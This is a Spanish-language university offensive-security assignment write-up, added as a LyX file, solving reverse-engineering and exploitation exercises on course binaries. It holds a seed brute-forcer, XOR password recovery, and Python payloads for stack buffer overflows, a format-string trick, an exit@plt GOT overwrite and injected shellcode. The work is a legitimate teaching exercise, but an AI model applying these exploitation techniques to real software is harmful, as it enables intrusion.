@@ -1,0 +1,1405 @@
+#LyX 2.3 created this file. For more info see http://www.lyx.org/
+\lyxformat 544
+\begin_document
+\begin_header
+\save_transient_properties true
+\origin unavailable
+\textclass article
+\begin_preamble
+\usepackage{pgfplots}
+\end_preamble
+\use_default_options true
+\begin_modules
+tcolorbox
+\end_modules
+\maintain_unincluded_children false
+\language spanish-mexico
+\language_package default
+\inputencoding auto
+\fontencoding global
+\font_roman "default" "default"
+\font_sans "default" "default"
+\font_typewriter "default" "default"
+\font_math "auto" "auto"
+\font_default_family default
+\use_non_tex_fonts false
+\font_sc false
+\font_osf false
+\font_sf_scale 100 100
+\font_tt_scale 100 100
+\use_microtype false
+\use_dash_ligatures true
+\graphics default
+\default_output_format default
+\output_sync 0
+\bibtex_command default
+\index_command default
+\paperfontsize 12
+\spacing single
+\use_hyperref false
+\papersize default
+\use_geometry false
+\use_package amsmath 1
+\use_package amssymb 1
+\use_package cancel 1
+\use_package esint 1
+\use_package mathdots 1
+\use_package mathtools 1
+\use_package mhchem 1
+\use_package stackrel 1
+\use_package stmaryrd 1
+\use_package undertilde 1
+\cite_engine basic
+\cite_engine_type default
+\biblio_style plain
+\use_bibtopic false
+\use_indices false
+\paperorientation portrait
+\suppress_date false
+\justification true
+\use_refstyle 1
+\use_minted 1
+\index Index
+\shortcut idx
+\color #008000
+\end_index
+\secnumdepth 3
+\tocdepth 3
+\paragraph_separation indent
+\paragraph_indentation default
+\is_math_indent 0
+\math_numbering_side default
+\quotes_style french
+\dynamic_quotes 0
+\papercolumns 1
+\papersides 1
+\paperpagestyle default
+\tracking_changes false
+\output_changes false
+\html_math_output 0
+\html_css_as_file 0
+\html_be_strict false
+\end_header
+
+\begin_body
+
+\begin_layout Title
+Seguridad Ofensiva 2020: Trabajo Práctico 4
+\end_layout
+
+\begin_layout Author
+Federico Juan Badaloni y Damián Ariel Marotte
+\end_layout
+
+\begin_layout Standard
+\begin_inset Newpage pagebreak
+\end_inset
+
+
+\end_layout
+
+\begin_layout Section*
+Ejercicio 1
+\end_layout
+
+\begin_layout Standard
+Luego de decompilar el binario con ghidra y modificarlo cuidadosamente,
+ obtenemos un programa como este:
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "language=C"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+#include <stdio.h>
+\end_layout
+
+\begin_layout Plain Layout
+
+#include <stdlib.h>
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+void main() {
+\end_layout
+
+\begin_layout Plain Layout
+
+    unsigned int random;
+\end_layout
+
+\begin_layout Plain Layout
+
+    char entrada[128];
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+    srand((unsigned int) main);
+\end_layout
+
+\begin_layout Plain Layout
+
+    fgets(entrada, 128, stdin);
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+    int i = 0;
+\end_layout
+
+\begin_layout Plain Layout
+
+    while (entrada[i] != '
+\backslash
+0' && entrada[i] != '
+\backslash
+n') {
+\end_layout
+
+\begin_layout Plain Layout
+
+        random = rand();
+\end_layout
+
+\begin_layout Plain Layout
+
+        printf("%02x", (int) entrada[i] ^ random & 0xff);
+\end_layout
+
+\begin_layout Plain Layout
+
+        i++;
+\end_layout
+
+\begin_layout Plain Layout
+
+    }
+\end_layout
+
+\begin_layout Plain Layout
+
+    putchar('
+\backslash
+n');
+\end_layout
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Puede observarse que la contraseña se genera aleatoriamente (puede depende
+ de la dirección de 
+\begin_inset Quotes fld
+\end_inset
+
+
+\family typewriter
+main
+\family default
+
+\begin_inset Quotes frd
+\end_inset
+
+, que es diferente en cada protección debido a diversas protecciones).
+ Sin embargo poseemos un hash de la entrada utilizada; esto nos permitió
+ diseñar un programa que haga fuerza bruta sobre las semillas posibles.
+\end_layout
+
+\begin_layout Standard
+Para optimizar este proceso, analizamos el binario con gdb y observamos
+ que la dirección de 
+\begin_inset Quotes fld
+\end_inset
+
+
+\family typewriter
+main
+\family default
+
+\begin_inset Quotes frd
+\end_inset
+
+ era mayor a 
+\family typewriter
+0x50000000
+\family default
+ y siempre se repetían los últimos 3 dígitos.
+\end_layout
+
+\begin_layout Standard
+Con todo esto en mente, desarrollamos el siguiente programa que fabrica
+ el archivo 
+\family typewriter
+secrets.txt
+\family default
+:
+\begin_inset Newpage pagebreak
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "language=C"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+// gcc decode.c -m32
+\end_layout
+
+\begin_layout Plain Layout
+
+#include <stdio.h>  // printf
+\end_layout
+
+\begin_layout Plain Layout
+
+#include <stdlib.h> // srand
+\end_layout
+
+\begin_layout Plain Layout
+
+#include <string.h> // strlen
+\end_layout
+
+\begin_layout Plain Layout
+
+#define FIRST_DIGIT 0xf0000000
+\end_layout
+
+\begin_layout Plain Layout
+
+#define LAST_DIGITS 0x66c
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+void main() {
+\end_layout
+
+\begin_layout Plain Layout
+
+    char command[300], tmp[300];
+\end_layout
+
+\begin_layout Plain Layout
+
+    char md5[] = "080d5caaed95af9ab072c41de3a73c24";
+\end_layout
+
+\begin_layout Plain Layout
+
+    unsigned char output[] = {
+\end_layout
+
+\begin_layout Plain Layout
+
+        0xd7, 0x40, 0xa5, 0xdc, 0x60, 0x7f, 0x78, 0xfb, 0xff, 0xe5, 0x20,
+ 0xef,
+\end_layout
+
+\begin_layout Plain Layout
+
+        0xc7, 0xca, 0xeb, 0xd2, 0x13, 0x79, 0x40, 0xdd, 0xb2, 0x6c, 0x30,
+ 0xc2,
+\end_layout
+
+\begin_layout Plain Layout
+
+        0xfd, 0x37, 0xed, 0x74, 0x3b, 0x77, 0x03, 0x8d, 0x32, 0x6a, 0x9c,
+ 0x7e,
+\end_layout
+
+\begin_layout Plain Layout
+
+        0x7e, 0x80
+\end_layout
+
+\begin_layout Plain Layout
+
+    };
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+    int size = sizeof(output) / sizeof(output[0]);
+\end_layout
+
+\begin_layout Plain Layout
+
+    unsigned char input[size];
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+    for (int j = 0x0000; j < 0xffff; j++) {
+\end_layout
+
+\begin_layout Plain Layout
+
+        int seed = FIRST_DIGIT + j * 4096 + LAST_DIGITS;
+\end_layout
+
+\begin_layout Plain Layout
+
+        if (!(j % 0x1000)) printf("Trying seed %#x...
+\backslash
+n", seed);
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+        srand(seed);
+\end_layout
+
+\begin_layout Plain Layout
+
+        for (int i = tmp[0] = 0; i < size; i++) {
+\end_layout
+
+\begin_layout Plain Layout
+
+            input[i] = output[i] ^ rand() & 0xff;
+\end_layout
+
+\begin_layout Plain Layout
+
+            sprintf(&tmp[strlen(tmp)], "
+\backslash
+
+\backslash
+x%x", input[i]);
+\end_layout
+
+\begin_layout Plain Layout
+
+        }
+\end_layout
+
+\begin_layout Plain Layout
+
+        sprintf(command, "bash -c 'echo -ne 
+\backslash
+"%s
+\backslash
+" | md5sum | grep -q %s'
+\backslash
+n", tmp, md5);
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+        if (!system(command)) {
+\end_layout
+
+\begin_layout Plain Layout
+
+            fwrite(input, size, 1, fopen("secret.txt", "w"));
+\end_layout
+
+\begin_layout Plain Layout
+
+            printf("DONE! Look at secret.txt
+\backslash
+n");
+\end_layout
+
+\begin_layout Plain Layout
+
+            return;
+\end_layout
+
+\begin_layout Plain Layout
+
+        }
+\end_layout
+
+\begin_layout Plain Layout
+
+    }
+\end_layout
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+El contenido de 
+\family typewriter
+secrets.txt
+\family default
+ exhibe la flag 
+\family typewriter
+
+\begin_inset Quotes fld
+\end_inset
+
+The flag is EKO{bullshit_PIE_over_x86}
+\family default
+
+\begin_inset Quotes frd
+\end_inset
+
+.
+\end_layout
+
+\begin_layout Section*
+Ejercicio 2
+\end_layout
+
+\begin_layout Standard
+El binario que decidimos analizar fue 
+\family typewriter
+r1
+\family default
+.
+ Para poder encontrar la contraseña ganadora, se siguió el siguiente procedimien
+to.
+\end_layout
+
+\begin_layout Enumerate
+Decompilamos el binario con 
+\family typewriter
+ghidra
+\family default
+.
+\end_layout
+
+\begin_layout Enumerate
+Luego de analizar cuidadosamente el resultado obtenido, detectamos un proceso
+ de encriptado One Time Pad.
+ La clave de encriptación se encuentra identificada en el binario como 
+\begin_inset Quotes fld
+\end_inset
+
+
+\emph on
+storedpass
+\emph default
+
+\begin_inset Quotes frd
+\end_inset
+
+.
+ Revisando el desensamblado del binario puede verse que dicha clave es 
+\begin_inset Quotes fld
+\end_inset
+
+
+\family typewriter
+5tr0vZBrX:xTyR-P!
+\family default
+
+\begin_inset Quotes frd
+\end_inset
+
+.
+\end_layout
+
+\begin_layout Enumerate
+Finalmente, basándonos en esta información, elaboramos el siguiente programa
+ en C que recupera la password.
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "language=C"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+#include <stdio.h>
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+void main() {
+\end_layout
+
+\begin_layout Plain Layout
+
+	char storedpass[] = 
+\begin_inset Quotes fld
+\end_inset
+
+5tr0vZBrX:xTyR-P!
+\begin_inset Quotes frd
+\end_inset
+
+;
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+	for (int i = 0; storedpass[i]; i++)
+\end_layout
+
+\begin_layout Plain Layout
+
+		printf(
+\begin_inset Quotes fld
+\end_inset
+
+%c
+\begin_inset Quotes frd
+\end_inset
+
+, i ^ storedpass[i]);
+\end_layout
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+La password para ganar es 
+\begin_inset Quotes fld
+\end_inset
+
+
+\family typewriter
+5up3r_DuP3r_u_#_1
+\family default
+
+\begin_inset Quotes frd
+\end_inset
+
+.
+\begin_inset Newpage pagebreak
+\end_inset
+
+
+\end_layout
+
+\begin_layout Section*
+Ejercicio 3
+\end_layout
+
+\begin_layout Subsection*
+Challenge 01
+\end_layout
+
+\begin_layout Enumerate
+En primer lugar comenzamos por observar el código fuente que tenemos disponible,
+ en busca variables escribibles.
+ En este caso en particular, la variable 
+\family typewriter
+buf
+\family default
+ puede ser escrita mediante la función insegura 
+\family typewriter
+gets
+\family default
+.
+\end_layout
+
+\begin_layout Enumerate
+Luego analizando el binario con 
+\family typewriter
+objdump -d 01-challenge
+\family default
+ tomamos nota del lugar de memoria donde comienza la instrucción 
+\family typewriter
+printf
+\family default
+ (
+\family typewriter
+0x0804845a
+\family default
+).
+\end_layout
+
+\begin_layout Enumerate
+Por ultimo, analizando el código, debemos calcular a que distancia de nuestra
+ variable escribible está la dirección de memoria donde se encuentra apuntada
+ la dirección a la que 
+\family typewriter
+main
+\family default
+ retornará.
+ Tenemos 80 bytes de buf, 4 bytes de cookie y 4 bytes del base pointer anterior;
+ en total 88 bytes.
+\end_layout
+
+\begin_layout Enumerate
+Con toda esta información y teniendo en cuenta el endianess de la arquitectura,
+ podemos generar una entrada que explote el binario:
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset listings
+lstparams "language=Python"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+data = " " * 88 + "
+\backslash
+x5a
+\backslash
+x84
+\backslash
+x04
+\backslash
+x08"
+\end_layout
+
+\begin_layout Plain Layout
+
+print data
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Subsection*
+Challenge 02
+\end_layout
+
+\begin_layout Standard
+Este desafío puede explotarse de manera análoga al anterior.
+\end_layout
+
+\begin_layout Subsection*
+Challenge 03
+\end_layout
+
+\begin_layout Standard
+El mismo procedimiento también puede aplicarse a este binario.
+\end_layout
+
+\begin_layout Subsection*
+Challenge 04
+\end_layout
+
+\begin_layout Enumerate
+Luego de analizar el código fuente, observamos que la dirección de retorno
+ que queremos modificar se encuentra a 
+\begin_inset Formula $1024\cdot4+4+4=4104$
+\end_inset
+
+ bytes de la variable 
+\family typewriter
+buf
+\family default
+.
+\end_layout
+
+\begin_layout Enumerate
+Además necesitamos que la variable 
+\family typewriter
+size
+\family default
+ sea menor o igual a 1024 pero que al multiplicarse por 
+\begin_inset Formula $4$
+\end_inset
+
+ sea lo suficientemente grande como para poder alcanzar la dirección previamente
+ mencionada.
+ El siguiente programa en C responde rápidamente nuestra pregunta:
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset listings
+lstparams "language=C"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+#include <stdio.h>
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+void main() {
+\end_layout
+
+\begin_layout Plain Layout
+
+    for (int size = 0x0; size < 0xffffffff; size++) {
+\end_layout
+
+\begin_layout Plain Layout
+
+        int x = size * sizeof(int);
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+        if (size <= 1024)
+\end_layout
+
+\begin_layout Plain Layout
+
+            if (x > 4108) {
+\end_layout
+
+\begin_layout Plain Layout
+
+                printf("0x%x
+\backslash
+n", size);
+\end_layout
+
+\begin_layout Plain Layout
+
+                return;
+\end_layout
+
+\begin_layout Plain Layout
+
+            }
+\end_layout
+
+\begin_layout Plain Layout
+
+    }
+\end_layout
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Enumerate
+Al igual que en el primer desafío, nos valemos de 
+\family typewriter
+objdump
+\family default
+ para tomar nota de la direccion donde comienza 
+\family typewriter
+printf
+\family default
+ (
+\family typewriter
+0x080484e7
+\family default
+).
+\end_layout
+
+\begin_layout Enumerate
+Finalmente generamos la entrada para atacar el programa:
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset listings
+lstparams "language=Python"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+data =  "
+\backslash
+x04
+\backslash
+x04
+\backslash
+x00
+\backslash
+x80"
+\end_layout
+
+\begin_layout Plain Layout
+
+data += "X" * 4104 + "
+\backslash
+xe7
+\backslash
+x84
+\backslash
+x04
+\backslash
+x08"
+\end_layout
+
+\begin_layout Plain Layout
+
+print data
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Subsection*
+Challenge 05
+\end_layout
+
+\begin_layout Standard
+También puede atacarse este programa siguiendo el mismo procedimiento que
+ en el apartado anterior.
+ Vale la pena notar que la variable 
+\family typewriter
+buf
+\family default
+ se encuentra 4 bytes mas cerca en este caso.
+\end_layout
+
+\begin_layout Subsection*
+Challenge 06
+\end_layout
+
+\begin_layout Enumerate
+En esta caso no podemos modificar la dirección a la que 
+\family typewriter
+main
+\family default
+ retorna, pues hay una llamada a la función 
+\family typewriter
+exit
+\family default
+.
+ Sin embargo podemos modificar la tabla de punteros a función que se utiliza
+ para hacer las llamadas.
+ Para esto, utilizando 
+\family typewriter
+objdump
+\family default
+, observamos en que dirección de memoria se encuentra el puntero a donde
+ se saltará en la etiqueta 
+\family typewriter
+exit@plt
+\family default
+ (
+\family typewriter
+0x0804a014
+\family default
+).
+\end_layout
+
+\begin_layout Enumerate
+También debemos observar donde comienza el código de la función 
+\family typewriter
+win
+\family default
+ (
+\family typewriter
+0x080484d8
+\family default
+).
+\end_layout
+
+\begin_layout Enumerate
+Si prestamos atención al código fuente, la función 
+\family typewriter
+strcpy
+\family default
+ nos permite escribir en la dirección apuntada por 
+\family typewriter
+buf01
+\family default
+ sin necesidad de desbordamiento.
+ Para aprovechar esto, desbordaremos la variable 
+\family typewriter
+buf02
+\family default
+, utilizándola tanto para sobrescribir 
+\family typewriter
+buf01
+\family default
+ como para decidir su contenido.
+\end_layout
+
+\begin_layout Enumerate
+Con toda esta información, y observando que 
+\family typewriter
+buf01
+\family default
+ se encuentra a 384 bytes luego de 
+\family typewriter
+buf02
+\family default
+, podemos generar la entrada maliciosa:
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset listings
+lstparams "language=Python"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+data =  "
+\backslash
+xd8
+\backslash
+x84
+\backslash
+x04
+\backslash
+x08"
+\end_layout
+
+\begin_layout Plain Layout
+
+data += "X" * 380 + "
+\backslash
+x14
+\backslash
+xa0
+\backslash
+x04
+\backslash
+x08"
+\end_layout
+
+\begin_layout Plain Layout
+
+print data
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Subsection*
+Challenge 07
+\end_layout
+
+\begin_layout Enumerate
+Un breve análisis del binario, nos revela que la instrucción deseada no
+ forma parte de este, por lo tanto deberemos inyectar código para poder
+ atacarlo.
+ Comenzamos entonces escribiendo un pequeño programa en ensamblador que
+ imprime la cadena deseada:
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset listings
+lstparams "language=TeX"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+section .text
+\end_layout
+
+\begin_layout Plain Layout
+
+    global _start
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+_start:
+\end_layout
+
+\begin_layout Plain Layout
+
+    xor eax,eax
+\end_layout
+
+\begin_layout Plain Layout
+
+    push eax
+\end_layout
+
+\begin_layout Plain Layout
+
+    push 0x214e4957
+\end_layout
+
+\begin_layout Plain Layout
+
+    push 0x20554f59
+\end_layout
+
+\begin_layout Plain Layout
+
+    mov ebx, 0x1
+\end_layout
+
+\begin_layout Plain Layout
+
+    mov ecx, esp
+\end_layout
+
+\begin_layout Plain Layout
+
+    mov dl, 0x8
+\end_layout
+
+\begin_layout Plain Layout
+
+    mov al, 0x4
+\end_layout
+
+\begin_layout Plain Layout
+
+    int 0x80
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Enumerate
+Corremos el programa con 
+\family typewriter
+gdb
+\family default
+, ponemos un punto de corte con 
+\family typewriter
+b _start
+\family default
+ y lo ejecutamos con 
+\family typewriter
+r
+\family default
+.
+ Ahora podemos examinar como se almacena exactamente nuestro código en la
+ memoria con formato decimal con signo, utilizando el comando 
+\family typewriter
+x/9d _start
+\family default
+.
+\end_layout
+
+\begin_layout Enumerate
+Finalmente generamos la salida que ataca el programa, sin olvidar aplicar
+ nuestra técnica para modificar la dirección apuntada en la etiqueta 
+\family typewriter
+exit@plt
+\family default
+:
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset listings
+lstparams "language=Python,fontsize={\footnotesize}"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+print("0
+\backslash
+n1750122545")  # 0x6850c031
+\end_layout
+
+\begin_layout Plain Layout
+
+print("1
+\backslash
+n558778711")   # 0x214e4957
+\end_layout
+
+\begin_layout Plain Layout
+
+print("2
+\backslash
+n1431263592")  # 0x554f5968
+\end_layout
+
+\begin_layout Plain Layout
+
+print("3
+\backslash
+n113440")      # 0x0001bb20
+\end_layout
+
+\begin_layout Plain Layout
+
+print("4
+\backslash
+n-511115264")  # 0xe1890000
+\end_layout
+
+\begin_layout Plain Layout
+
+print("5
+\backslash
+n78645426")    # 0x04b008b2
+\end_layout
+
+\begin_layout Plain Layout
+
+print("6
+\backslash
+n771784909")   # 0x2e0080cd
+\end_layout
+
+\begin_layout Plain Layout
+
+print("7
+\backslash
+n1953331571")  # 0x746d7973
+\end_layout
+
+\begin_layout Plain Layout
+
+print("8
+\backslash
+n771777121")   # 0x2e006261
+\end_layout
+
+\begin_layout Plain Layout
+
+print("-14
+\backslash
+n134520896") # Modify exit@plt
+\end_layout
+
+\begin_layout Plain Layout
+
+print("1024
+\backslash
+n1024")     # End
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Subsection*
+Challenge 08
+\end_layout
+
+\begin_layout Standard
+Podemos utilizar las mismas técnicas descritas hasta aquí para atacar este
+ binario.
+ Tomamos nota de la dirección de la función objetivo, medimos el tamaño
+ de la estructura (256 bytes + 4 bytes) y generamos la entrada.
+ Vale la pena notar que no podemos desbordar a partir de 
+\family typewriter
+p[800]->data
+\family default
+ pues previamente el código hace 
+\family typewriter
+free(p[i])
+\family default
+.
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "language=Python,fontsize={\normalsize}"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+data =  "799"
+\end_layout
+
+\begin_layout Plain Layout
+
+data += "X" * 256 + "X" * 4
+\end_layout
+
+\begin_layout Plain Layout
+
+data += "
+\backslash
+x80
+\backslash
+x85
+\backslash
+x04
+\backslash
+x08"
+\end_layout
+
+\begin_layout Plain Layout
+
+print data
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Subsection*
+Challenge 09
+\end_layout
+
+\begin_layout Standard
+En este desafío tenemos completo control sobre una cadena de formato, sin
+ embargo el código fuente nos impide escribir 
+\begin_inset Quotes fld
+\end_inset
+
+WIN!
+\begin_inset Quotes frd
+\end_inset
+
+.
+ Aprovechamos los placeholders de la función 
+\family typewriter
+printf
+\family default
+ para poder esquivar esta restricción:
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "language=Python,fontsize={\normalsize}"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+print "!YOU WIN%c"
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Subsection*
+Challenge 10
+\end_layout
+
+\begin_layout Standard
+Observemos que el arreglo 
+\family typewriter
+buf
+\family default
+ posee 255 elementos (desde el 0 al 254).
+ Luego la función read nos permitirá desbordar solamente 2 bytes.
+ Afortunadamente los siguientes 2 bytes ya se encuentran bien establecidos,
+ por lo que esto será suficiente para modificar la dirección a la que 
+\family typewriter
+main
+\family default
+ retorna.
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "language=Python,fontsize={\normalsize}"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+data = "X" * 254 + "
+\backslash
+x84
+\backslash
+x38"
+\end_layout
+
+\begin_layout Plain Layout
+
+print data
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_body
+\end_document
